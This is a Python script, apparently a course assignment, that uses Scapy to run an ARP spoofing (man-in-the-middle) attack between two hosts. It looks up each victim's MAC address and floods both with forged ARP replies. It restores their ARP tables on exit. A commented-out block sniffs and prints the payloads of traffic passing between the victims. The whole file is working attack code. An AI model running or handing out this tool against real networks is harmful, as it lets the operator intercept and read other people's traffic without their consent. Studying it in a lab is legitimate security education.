from scapy.all import IP
import sys
from scapy.all import ARP, Ether, srp, conf
from scapy.all import send
import time
from scapy.all import ARP, Ether, srp, send, sniff, IP, conf, sendp


# --- Configuration ---
# It's good practice to define the attacker's interface.
# Based on the assignment, the attacker is on 'eth0'.
ATTACKER_INTERFACE = "eth0"
conf.verb = 0  # Make Scapy less verbose


def spoof_arp(victim_ip, victim_mac, spoof_ip):
    """
    Sends a crafted ARP reply to victim_ip, making them think spoof_ip is at attacker's MAC.
    """
    arp_reply = ARP(
        op=2,                  # ARP reply
        pdst=victim_ip,        # Destination IP (victim)
        hwdst=victim_mac,      # Destination MAC (victim's MAC)
        psrc=spoof_ip          # Source IP (spoofed: "I am this IP")
        # hwsrc is auto-filled as attacker's MAC
    )
    # send(arp_reply, iface=ATTACKER_INTERFACE, verbose=False)
    # Wrap the ARP reply in an Ethernet frame with the victim's MAC as the destination
    ethernet_frame = Ether(dst=victim_mac) / arp_reply

    # Send the Ethernet frame
    sendp(ethernet_frame, iface=ATTACKER_INTERFACE, verbose=False)


def get_mac(ip_address):
    """
    Sends an ARP request to the given IP address and returns its MAC address.
    """
    print(f"[*] Attempting to get MAC address for IP: {ip_address}")
    # Craft an ARP request packet.
    # Ether(dst="ff:ff:ff:ff:ff:ff") specifies the broadcast MAC address for the Ethernet frame.
    # ARP(pdst=ip_address) specifies the target IP address in the ARP payload.
    arp_request_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)

    # srp() sends and receives packets at layer 2.
    # - arp_request_packet: the packet to send.
    # - timeout: how long to wait for a response (in seconds).
    # - iface: the network interface to send the packet from.
    # - verbose: False to suppress Scapy's default output.
    # - conf.verb = 0 (set globally) also helps keep Scapy quiet.
    # srp returns two lists: (answered_packets, unanswered_packets)
    answered_packets, _ = srp(
        arp_request_packet, timeout=2, iface=ATTACKER_INTERFACE, verbose=False)

    if answered_packets:
        # The MAC address is in the 'hwsrc' (hardware source) field of the received ARP packet.
        # answered_packets[0] is the first (and likely only) pair of (sent_packet, received_packet).
        # answered_packets[0][1] is the received_packet.
        # answered_packets[0][1][ARP].hwsrc is the MAC address from the ARP layer of the received packet.
        # Or, more simply, answered_packets[0][1].hwsrc if the received packet is an ARP reply.
        return answered_packets[0][1].hwsrc
    else:
        print(
            f"[!] Could not get MAC address for {ip_address}. Host may be down or unresponsive.")
        return None


def packet_callback(packet):
    """
    Called for every sniffed packet. Prints details if it's between the two victims.
    """
    if packet.haslayer(IP):
        ip_layer = packet[IP]
        src = ip_layer.src
        dst = ip_layer.dst

        # Only care about traffic between victim1 and victim2
        if (src == victim1_ip and dst == victim2_ip) or (src == victim2_ip and dst == victim1_ip):
            # Try to print the raw payload of the last layer
            payload = bytes(ip_layer.payload)
            print(f"Received traffic from {src} to {dst}: {payload}")


def restore_arp(victim_ip, victim_mac, source_ip, source_mac):
    """
    Restores the ARP table for victim_ip by sending a legitimate ARP reply
    telling it the true MAC (source_mac) for source_ip.
    """
    arp_restore_packet = Ether(dst=victim_mac, src=source_mac) / \
        ARP(op=2,                  # ARP reply
            pdst=victim_ip,        # Victim's IP
            hwdst=victim_mac,      # Victim's MAC
            # The OTHER victim's IP (real source)
            psrc=source_ip,
            # The OTHER victim's MAC (real MAC for that IP)
            hwsrc=source_mac)
    sendp(arp_restore_packet, iface=ATTACKER_INTERFACE,
          count=4, inter=0.2, verbose=False)
    print(
        f"[*] Sent ARP restore to {victim_ip}: {source_ip} IS-AT {source_mac}")


def main():
    # Check if the correct number of command line arguments are provided
    if len(sys.argv) != 3:
        print("Error: Incorrect Usage!")
        print("Usage: python3 spoof_arp.py <victim1_ip> <victim2_ip>")
        sys.exit(1)

    # Get the IP addresses of the victims from command line arguments
    global victim1_ip, victim2_ip
    victim1_ip = sys.argv[1]
    victim2_ip = sys.argv[2]

    # Print the IP addresses of the victims
    print(f"Victim 1 IP: {victim1_ip}")
    print(f"Victim 2 IP: {victim2_ip}")

    # Get the MAC addresses of the victims
    victim1_mac = get_mac(victim1_ip)
    victim2_mac = get_mac(victim2_ip)

    # Check if the MAC addresses were successfully retrieved
    if not victim1_mac or not victim2_mac:
        print("Error: Failed to get MAC addresses. Exiting...")
        sys.exit(1)

    # Print the MAC addresses of the victims
    print(f"Victim 1 MAC: {victim1_mac}")
    print(f"Victim 2 MAC: {victim2_mac}")

    print("[*] Starting ARP spoofing... Press Ctrl+C to stop and restore tables.")
    try:
        while True:
            # Spoof ARP for both victims
            spoof_arp(victim1_ip, victim1_mac, victim2_ip)
            spoof_arp(victim2_ip, victim2_mac, victim1_ip)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected.")
        print("[*] Restoring ARP tables...")
        restore_arp(victim1_ip, victim1_mac, victim2_ip,
                    victim2_mac)
        restore_arp(victim2_ip, victim2_mac, victim1_ip,
                    victim1_mac)
        print("[*] ARP tables restored.")
        sys.exit(0)

    # try:
    #     # Start a background thread to continuously poison
    #     import threading

    #     def poison_loop():
    #         while True:
    #             spoof_arp(victim1_ip, victim1_mac, victim2_ip)
    #             spoof_arp(victim2_ip, victim2_mac, victim1_ip)
    #             time.sleep(2)

    #     poison_thread = threading.Thread(target=poison_loop)
    #     poison_thread.daemon = True
    #     poison_thread.start()

    #     # Now start sniffing packets (main thread)
    #     print("[*] Sniffing traffic between victims...")
    #     sniff(iface=ATTACKER_INTERFACE, prn=packet_callback, store=0)

    # except KeyboardInterrupt:
    #     print("\n[!] Ctrl+C detected.")
    #     print("[*] Restoring ARP tables...")
        # restore_arp(victim1_ip, victim1_mac, victim2_ip,
        # victim2_mac)
        # restore_arp(victim2_ip, victim2_mac, victim1_ip,
        # victim1_mac)
        # print("[*] ARP tables restored.")
        # sys.exit(0)


if __name__ == "__main__":
    main()
